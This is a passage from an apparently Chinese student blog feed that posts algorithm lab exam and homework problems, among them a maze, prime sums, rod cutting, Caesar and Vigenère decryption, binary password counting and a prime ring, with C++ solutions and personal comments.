title="提示"></a>提示</h3><p>肯定是递归做，但是dp数组用二维的不知道为什么总是数组超限，考完和同学交流了一下，发现不是个例，考试的时候我还提交了一维的写法，但是时间又超限了，时间卡在1040，差40就可以过了，但是我交了30多遍也没用，代码就不贴出来了（我还是太弱了）。</p><h2 id="问题-C-迷宫问题"><a href="#问题-C-迷宫问题" class="headerlink" title="问题 C: 迷宫问题"></a>问题 C: 迷宫问题</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个N行M列的迷宫，其中’.’代表空地，可以通行；’#’代表障碍物，无法通行；’S’代表起点；’T’代表终点；’’S’和’T’这两个位置也是空地，可以通行。在迷宫中可以向上、下、左、右四个不同的方向行走，请你判断从起点出发是否可以走到终点？如果可以，请你计算到达终点最少需要走几步。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第1行，2个整数，N和M，中间用空格隔开。N为迷宫的行，M为迷宫的列。(2 &lt;= N,M &lt;= 1000)<br>第2 ~ N+1行，每行M个字符，对应整个迷宫的布局，输入数据中保证只有’.’,’#’,’S’,’T’这四种字符，并且只有一个’S’，只有一个’T’。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>如果可以到达终点，输出两行，第一行输出”YES”，第二行输出一个整数代表最少需要走几步。如果无法到达终点，输出”NO”。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4 9</span><br><span class="line">#S#.#.#T#</span><br><span class="line">#....##.#</span><br><span class="line">#.##....#</span><br><span class="line">#....####</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>回溯，但是考试前觉得不会考，也没怎么看，拿到手有思路，就是没写出来（话说好像和数据结构实验的最后一题差不多）</p><h2 id="问题-D-素数问题"><a href="#问题-D-素数问题" class="headerlink" title="问题 D: 素数问题"></a>问题 D: 素数问题</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>葬爱家族的Halobin近在研究素数，他想知道对于两个整数x和y（x&gt;y），能否找到若干个素数p1,p2,…pk，使得x=y+p1+p2+…+pk。注意素数可以无限重复使用，例如x=9,y=1，那么只需要用4个2就可以了，即9=1+2+2+2+2.</p><p>请你帮他解决这个问题。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>第一行输入数据组数T(T&lt;100)</p><p>接下来T行每行输入两个整数x和y（0&lt;y&lt;x&lt;10<sup>9</sup>）</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>如果能找到若干个素数满足条件，输出“YES”，否则输出“NO”</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">100 98</span><br><span class="line">42 36</span><br><span class="line">100000000 1</span><br><span class="line">41 40</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>这题本是签到题，但是老师中途说了思路（两数之差是1就不可能，不是就可以），我感觉是实在看不下去我们做的题了，所以才来告诉我们答案，感觉智商被按在地上摩擦。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t,x,y;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">if</span>((x-y)&gt;<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"YES"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"NO"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-锯木棒"><a href="#问题-E-锯木棒" class="headerlink" title="问题 E: 锯木棒"></a>问题 E: 锯木棒</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>xiaok大佬最近再雇佣工人给他掰木棒。把一根长为L的木棒锯成两段，他需要支付给工人L元钱。xiaok大佬一开始只有长为L的一根木棒，他想把它锯成n段，每段长度分别为L1,L2,…,Ln，问xiaok大佬最少要付给工人多少钱？</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>第一行两个整数n,L(1&lt;n&lt;10<sup>3</sup>,n&lt;L&lt;10<sup>9</sup>)</p><p>第二行n个整数L1,L2,…,Ln（0&lt;Li&lt;L,且保证L1+L2+…+Ln=L）</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示最小花费</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3 21</span><br><span class="line">8 5 8</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>先把木棒锯成13和8两段，花费21，再把13那段锯成5和8，花费13，总花费13+21=34</p><p>很明显，贪心，设个优先级队列，（参考哈夫曼树）</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a,<span class="keyword">int</span>&amp; b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp1&gt; pq;</span><br><span class="line">    <span class="keyword">int</span> n,l,s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        pq.push(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(pq.size()&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a=pq.top();</span><br><span class="line">        pq.pop();</span><br><span class="line">        <span class="keyword">int</span> b=pq.top();</span><br><span class="line">        pq.pop();</span><br><span class="line">        sum=sum+a+b;</span><br><span class="line">        pq.push(a+b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;算法实验上机考试&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://1187100546.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://1187100546.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>算法实验作业</title>
    <link href="https://1187100546.github.io/2019/10/26/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/"/>
    <id>https://1187100546.github.io/2019/10/26/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/</id>
    <published>2019-10-26T09:20:56.000Z</published>
    <updated>2019-11-09T09:26:28.079Z</updated>
    
    <content type="html"><![CDATA[<p>算法作业。</p><a id="more"></a><h2 id="问题-A-凯撒加密法"><a href="#问题-A-凯撒加密法" class="headerlink" title="问题 A: 凯撒加密法"></a>问题 A: 凯撒加密法</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>​    凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。<br>​    例如，当偏移量是左移3的时候：<br>明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC<br>使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：<br>​    明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>​    密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ<br>​    现在给定你一个字符串S（长度不会超过1000000）和一个整数k（-1000000000&lt;=k&lt;=1000000000），分别代表接受者收到的密文和在加密该密文时向后的偏移量，你的任务是计算出原来的明文<br>​    注意：只有字母在加密时才会发生偏移，其它字符保持不变</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>​    输入包含多组数据，其中第一行为数据组数T（T&lt;=10）<br>​    每组数据第一行为一个字符串S，由数字、字母以及常见字符组成（不含空格），第二行为一个整数k代表加密时向后的偏移量（|S|&lt;=1000000,-1000000000&lt;=k&lt;=1000000000）</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>​    对每组数据，输出一行字符串，代表输入中的密文对应的明文。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">DEFGHIJKLMNOPQRSTUVWXYZABC</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        k=k%<span class="number">26</span>;</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">'A'</span>&amp;&amp;s[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s[i]=s[i]-k;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&lt;<span class="string">'A'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]+<span class="number">26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&gt;<span class="string">'Z'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]<span class="number">-26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">'a'</span>&amp;&amp;s[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s[i]=s[i]-k;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&lt;<span class="string">'a'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]+<span class="number">26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&gt;<span class="string">'z'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]<span class="number">-26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-Vigenere-密码"><a href="#问题-B-Vigenere-密码" class="headerlink" title="问题 B: Vigenère 密码"></a><strong>问题 B: Vigenère 密码</strong></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>16 世纪法国外交家 Blaise de Vigenère 设计了一种多表密码加密算法——Vigenère 密码。Vigenère 密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。</p><p>在密码学中，我们称需要加密的信息为明文，用 M<em>M</em> 表示；称加密后的信息为密文，用 C<em>C</em> 表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为 k<em>k</em>。 在 Vigenère 密码中，密钥 k<em>k</em> 是一个字母串，<em>k</em>=<em>k1k2…kn</em>。当明文 M = m1m2…mn 时，得到的密文 C = c1c2…cn ，其中 ci = mi ® ki，运算 ® 的规则如下表所示：</p><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180910/20180910173109_58996.png" alt="img"></p><p>Vigenère 加密在操作时需要注意：</p><ol><li>® 运算忽略参与运算的字母的大小写，并保持字母在明文 M<em>M</em> 中的大小写形式；</li><li>当明文 M<em>M</em> 的长度大于密钥 k<em>k</em> 的长度时，将密钥 k<em>k</em> 重复使用。 例如，明文 M=<em>M</em>=Helloworld，密钥 k=<em>k</em>=abc时，密文 C=<em>C</em>=Hfnlpyosnd。</li></ol><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180910/20180910173353_81009.png" alt="img"></p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第一行为一个字符串，表示密钥 k<em>k</em>，长度不超过 100100，其中仅包含大小写字母。</p><p>第二行为一个字符串，表示经加密后的密文，长度不超过 10001000，其中仅包含大小写字母。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出共 11 行，一个字符串，表示输入密钥和密文所对应的明文。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CompleteVictory</span><br><span class="line">Yvqgpxaimmklongnzfwpvxmniytm</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wherethereisawillthereisaway</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">102</span>],c[<span class="number">1002</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> temp; </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;c;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;c[j]!=<span class="string">'\0'</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(c[j]&gt;=<span class="string">'A'</span>&amp;&amp;c[j]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">            <span class="keyword">if</span>(k[i]&gt;=<span class="string">'A'</span>&amp;&amp;k[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">                temp=(c[j]-<span class="string">'A'</span>-(k[i]-<span class="string">'A'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'A'</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                temp=(c[j]-<span class="string">'A'</span>-(k[i]-<span class="string">'a'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'A'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(k[i]&gt;=<span class="string">'A'</span>&amp;&amp;k[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">                temp=(c[j]-<span class="string">'a'</span>-(k[i]-<span class="string">'A'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'a'</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                temp=(c[j]-<span class="string">'a'</span>-(k[i]-<span class="string">'a'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'a'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;temp;</span><br><span class="line">        i++;</span><br><span class="line">         <span class="keyword">if</span>(k[i]==<span class="string">'\0'</span>) i=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-简单的密码"><a href="#问题-C-简单的密码" class="headerlink" title="问题 C: 简单的密码"></a>问题 C: 简单的密码</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>密码是按特定法则编成，用以对通信双方的信息进行明密变换的符号。密码是隐蔽了真实内容的符号序列。其实就是把用公开的、标准的信息编码表示的信息通过一种变换手段，将其变为除通信双方以外其他人所不能读懂的信息编码，这种独特的信息编码就是密码。<br>现在我们定义一种非常简单的密码，它的长度固定为n（n&lt;=30）并且每一位只能由数字0或者数字1组成，但是有一个特殊的要求：一个密码序列中至少要有连续的3个0出现才可以，否则就是无效的。现在给定你密码序列的长度n，你的任务是计算长度为n的序列能产生多少种不同的并且有效的密码？</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组数据，每组数据只有一个正整数n（1&lt;=n&lt;=30）代表密码序列的长度，单独占一行。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一个整数，代表长度为n的序列能产生的不同密码的种类数。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">8</span><br><span class="line">20</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">32</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">20</span>,<span class="number">47</span>,<span class="number">107</span>,<span class="number">238</span>,<span class="number">520</span>,<span class="number">1121</span>,<span class="number">2391</span>,<span class="number">5056</span>,<span class="number">10616</span>,<span class="number">22159</span>,<span class="number">46023</span>,<span class="number">95182</span>,<span class="number">196132</span>,<span class="number">402873</span>,<span class="number">825259</span>,<span class="number">1686408</span>,<span class="number">3438828</span>,<span class="number">6999071</span>,<span class="number">14221459</span>,<span class="number">28853662</span>,<span class="number">58462800</span>,<span class="number">118315137</span>,<span class="number">239186031</span>,<span class="number">483072832</span>,<span class="number">974791728</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-有趣的素数"><a href="#问题-D-有趣的素数" class="headerlink" title="问题 D: 有趣的素数"></a>问题 D: 有趣的素数</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>素数被广泛地应用于密码学中，所谓的公钥就是将想要传递的信息在编码时加入砠数，编码之后传给收信人，任何人收到此信息之后，若没有此收信人所拥有的秘钥，则在解密的过程中将会因为分解质因数过久而无法破解信息，可见素数在密码学中的重要性。<br>现在给你n（2&lt;=n&lt;=16）个正整数1,2,3…n，你的任务是把这n个正整数组成一个环，使得任意相邻的两个整数之和为一个素数，输出有多少种合法方案。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组输入数据，每组数据只有一个正整数n（2&lt;=n&lt;=16）代表有n个正整数 1,2,3…n</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一个整数，代表有多少种不同的可行方案数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h2><p>对于输入样例中的6，有以下2种合法方案（首尾相连构成一个环）</p><p>1 4 3 2 5 6</p><p>1 6 5 2 3 